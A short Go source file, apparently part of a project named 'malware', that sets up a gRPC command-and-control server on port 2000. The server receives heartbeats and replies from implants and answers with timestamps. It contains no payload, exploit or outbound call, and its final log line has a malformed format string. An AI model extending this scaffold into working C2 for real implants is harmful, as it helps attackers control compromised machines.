package main

import (
	"context"
	"fmt"
	"malware/common"
	"net"
	"time"

	pb "malware/common/messages"

	"google.golang.org/grpc"
)

type c2 struct {
	port int
}

func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
	switch u := req.Message.(type) {
	case *pb.CheckCmdRequest_Heartbeat:
	case *pb.CheckCmdRequest_Reply:
		fmt.Println("Reply", u)
	default:
		common.Panic("Didn't receive a valid message", req, u)
	}

	return &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}, nil
}

func main() {
	c2 := &c2{port: 2000}
	host := fmt.Sprintf(":%d", c2.port)
	listener, err := net.Listen("tcp", host)

	if err != nil {
		common.Panicf(err, "Hosting on %s failed", host)
	}

	defer listener.Close()

	server := grpc.NewServer()
	pb.RegisterMalwareServer(server, c2)
	server.Serve(listener)
	fmt.Println("Listening on s", server.GetServiceInfo())

}
